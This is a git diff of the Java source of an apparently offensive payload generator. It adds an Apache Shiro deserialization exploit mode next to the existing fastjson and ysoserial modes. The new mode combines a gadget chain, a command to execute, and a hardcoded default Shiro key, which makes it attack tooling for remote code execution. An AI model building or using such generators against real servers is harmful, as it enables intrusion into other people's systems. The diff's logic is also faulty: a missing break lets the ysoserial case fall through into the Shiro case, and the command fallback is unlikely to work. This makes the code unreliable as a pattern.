@@ -3,6 +3,7 @@ package com.ding0x0.run;
 import com.ding0x0.AbsGenerate;
 import com.ding0x0.Payload;
 import com.ding0x0.fastjson.GenerateFastjsonPayload;
+import com.ding0x0.other.GenerateShiroPayload;
 import com.ding0x0.yso.GenerateYsoPayload;
 import org.apache.commons.cli.CommandLine;
 import org.apache.commons.cli.Option;
@@ -39,16 +40,24 @@ public class Process {
     }
 
     public Object makeObject() throws Exception{
-//        String type = this.cmdline.getOptionValue(this.payloadType);
         String type = this.cmdline.getOptionValue(this.payloadType);
+        String cmd;
         AbsGenerate generate = null;
+        try {
+            cmd = this.cmdline.getOptionValue("c");
+        }catch (IndexOutOfBoundsException e){
+            cmd = "sb";
+        }
         switch (this.payloadType){
             case "fastjson":
                 generate = new GenerateFastjsonPayload(this.payloadParam, type);
                 break;
             case "yso":
-                String cmd = this.cmdline.getOptionValue(this.payloadParam.get(0));
                 generate = new GenerateYsoPayload(type, cmd);
+            case "shiro":
+                String key = this.cmdline.getOptionValue("k", "kPH+bIxk5D2deZiIxcaaaA==");
+                String gadget = this.cmdline.getOptionValue("g");
+                generate = new GenerateShiroPayload(gadget, key, cmd);
         }
         return generate.generatePayload();
     }
